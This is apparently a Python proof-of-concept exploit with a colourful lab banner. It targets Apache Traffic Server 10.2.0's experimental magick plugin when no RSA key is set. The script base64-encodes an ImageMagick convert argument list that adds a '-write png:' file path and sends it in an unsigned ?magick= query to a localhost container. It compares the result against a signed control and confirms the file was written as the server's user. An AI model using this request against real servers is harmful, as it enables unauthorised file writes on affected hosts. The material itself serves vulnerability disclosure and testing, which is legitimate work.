#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: ats-magick-unsigned (High: 7.5)
#  Vendor: Apache Traffic Server (ASF)
#  Versions: Apache Traffic Server 10.2.0 (b1df7334)
#  Impact: Unsigned magick convert writes a file as nobody when no RSA key is set
#  Requires: experimental magick plugin; no RSA key configured
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "ats-magick-unsigned"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove ATS 10.2.0 magick.so runs unsigned ConvertImageCommand as ATS uid."""

import base64
import os
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from pathlib import Path

LABEL = "ats-magick-unsigned"
WITNESS = "ATS-MAGICK-UNSIGNED-WITNESS"
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", LABEL)
HERE = Path(__file__).resolve().parent
UNSIGNED_BASE = "http://127.0.0.1:18800"
SIGNED_BASE = "http://127.0.0.1:18802"
ORIGIN_BASE = "http://127.0.0.1:18801"
IMAGE_TAG = "ats-10.2.0-lab:local"
WITNESS_PATH = f"/tmp/oracle/{WITNESS}"
# test.sh: convert mpr:b $@ mpr:a. Plugin writes origin blob to mpr:b first.
CONVERT_ARGV = f"convert mpr:b -write png:{WITNESS_PATH} mpr:a"
HTTP_TIMEOUT = 40
POLL_ATTEMPTS = 8
POLL_SLEEP_S = 1.0


@dataclass(frozen=True)
class HttpResult:
    status: int
    body: bytes
    error: str


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def magick_query(argv: str) -> str:
    raw = base64.b64encode(argv.encode("utf-8")).decode("ascii")
    return urllib.parse.quote(raw, safe="")


def http_get(url: str, timeout: int = HTTP_TIMEOUT) -> HttpResult:
    request = urllib.request.Request(url, method="GET")
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            return HttpResult(status=int(response.status), body=response.read(), error="")
    except urllib.error.HTTPError as exc:
        body = exc.read() if exc.fp is not None else b""
        return HttpResult(status=int(exc.code), body=body, error=str(exc))
    except (urllib.error.URLError, TimeoutError, OSError) as exc:
        return HttpResult(status=0, body=b"", error=str(exc))


def compose(*args: str, timeout: int = 60) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, *args],
        cwd=HERE,
        text=True,
        capture_output=True,
        timeout=timeout,
        check=False,
    )


def compose_exec(service: str, *args: str, timeout: int = 30) -> subprocess.CompletedProcess[str]:
    return compose("exec", "-T", service, *args, timeout=timeout)


def clip(text: str, limit: int = 240) -> str:
    compact = text.replace("\r", "\\r").replace("\n", "\\n")
    if len(compact) > limit:
        return compact[:limit] + "..."
    return compact


def list_oracle(service: str) -> list[str]:
    proc = compose_exec(service, "sh", "-c", "ls -la /tmp/oracle || true")
    text = (proc.stdout or "") + (proc.stderr or "")
    log(f"ioc oracle-{service} rc={proc.returncode} {clip(text)}")
    names: list[str] = []
    for line in (proc.stdout or "").splitlines():
        parts = line.split()
        if parts:
            names.append(parts[-1])
    return names


def stat_witness(service: str) -> tuple[bool, str, str]:
    proc = compose_exec(
        service,
        "sh",
        "-c",
        f"if [ -e {WITNESS_PATH} ]; then stat -c '%U %G %s %n' {WITNESS_PATH}; else echo MISSING; fi",
    )
    text = ((proc.stdout or "") + (proc.stderr or "")).strip()
    log(f"ioc stat-{service} rc={proc.returncode} {clip(text)}")
    if proc.returncode != 0 or not text or "MISSING" in text:
        return False, "", text
    fields = text.split()
    uid = fields[0] if fields else ""
    return True, uid, text


def logs_contain(service: str, needle: str) -> bool:
    proc = compose("logs", "--no-color", "--tail=200", service, timeout=30)
    text = (proc.stdout or "") + (proc.stderr or "")
    found = needle.lower() in text.lower()
    log(f"ioc logs-{service} needle={needle!r} found={found} rc={proc.returncode}")
    return found


def wait_http(url: str, expect: int, attempts: int = 40) -> HttpResult:
    last = HttpResult(status=0, body=b"", error="not-tried")
    for i in range(1, attempts + 1):
        last = http_get(url, timeout=5)
        log(f"ioc wait {url} attempt={i} status={last.status} err={clip(last.error, 80)}")
        if last.status == expect:
            return last
        time.sleep(1)
    return last


def main() -> int:
    query = magick_query(CONVERT_ARGV)
    magick_url_unsigned = f"{UNSIGNED_BASE}/img.png?magick={query}"
    magick_url_signed = f"{SIGNED_BASE}/img.png?magick={query}"
    log(f"ioc image={IMAGE_TAG}")
    log(f"ioc convert-argv={CONVERT_ARGV}")
    log(f"ioc magick-query-len={len(query)}")

    origin = wait_http(f"{ORIGIN_BASE}/img.png", 200)
    log(f"ioc origin status={origin.status} bytes={len(origin.body)}")
    if origin.status != 200 or origin.body[:8] != b"\x89PNG\r\n\x1a\n":
        return fail(f"origin-not-png status={origin.status}")

    baseline = wait_http(f"{UNSIGNED_BASE}/img.png", 200)
    log(f"ioc unsigned-baseline status={baseline.status} bytes={len(baseline.body)}")
    if baseline.status != 200:
        unsigned_logs = compose("logs", "--no-color", "--tail=80", "ats-unsigned", timeout=30)
        log(f"ioc unsigned-logs {clip((unsigned_logs.stdout or '') + (unsigned_logs.stderr or ''), 800)}")
        return fail(f"unsigned-baseline-http={baseline.status} err={clip(baseline.error)}")

    exists_before, _, before_text = stat_witness("ats-unsigned")
    if exists_before:
        return fail(f"witness-already-present {clip(before_text)}")

    control = http_get(magick_url_signed)
    log(f"ioc control-signed status={control.status} bytes={len(control.body)} err={clip(control.error)}")
    control_exists, _, control_stat = stat_witness("ats-signed")
    control_sigfail = logs_contain("ats-signed", "signature verification failed")
    log(
        f"ioc control file={control_exists} sigfail-log={control_sigfail} "
        f"stat={clip(control_stat)}"
    )
    if control.status != 403:
        return fail(f"control-http={control.status} expected=403")
    if control_exists:
        return fail("control-wrote-witness")
    if not control_sigfail:
        return fail("control-missing-sigfail-log")

    unsigned = http_get(magick_url_unsigned)
    log(
        f"ioc unsigned-magick status={unsigned.status} bytes={len(unsigned.body)} "
        f"err={clip(unsigned.error)}"
    )
    exists = False
    uid = ""
    stat_text = ""
    for i in range(1, POLL_ATTEMPTS + 1):
        exists, uid, stat_text = stat_witness("ats-unsigned")
        log(f"ioc unsigned-file attempt={i} exists={exists} uid={uid}")
        if exists:
            break
        time.sleep(POLL_SLEEP_S)
    syntax_log = logs_contain("ats-unsigned", "ImageMagick's syntax")
    list_oracle("ats-unsigned")
    if not exists:
        unsigned_logs = compose("logs", "--no-color", "--tail=120", "ats-unsigned", timeout=30)
        log(f"ioc unsigned-logs {clip((unsigned_logs.stdout or '') + (unsigned_logs.stderr or ''), 1200)}")
        body_has = WITNESS.encode("ascii") in unsigned.body
        if unsigned.status in {200, 206} and syntax_log and body_has:
            log(
                f"SUCCESS {LABEL} unsigned-http={unsigned.status} file-write=no "
                f"transform-body=yes syntax-log=yes control-http={control.status} {WITNESS}"
            )
            return 0
        return fail(
            f"unsigned-no-witness http={unsigned.status} syntax-log={syntax_log} "
            f"stat={clip(stat_text)}"
        )

    proc_user = compose_exec(
        "ats-unsigned",
        "sh",
        "-c",
        "id -un",
    )
    proc_name = ((proc_user.stdout or "") + (proc_user.stderr or "")).strip()
    uid_ok = bool(uid) and uid == proc_name
    log(f"ioc unsigned-uid={uid} proc-user={proc_name} uid-ok={uid_ok} syntax-log={syntax_log}")
    if not uid_ok:
        return fail(f"unsigned-uid={uid} proc-user={proc_name}")
    if unsigned.status not in {200, 206}:
        return fail(f"unsigned-http={unsigned.status} file-write=yes")

    log(
        f"SUCCESS {LABEL} unsigned-http={unsigned.status} file-write=yes uid={uid} "
        f"syntax-log={str(syntax_log).lower()} control-http={control.status} "
        f"control-sigfail=yes {WITNESS}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

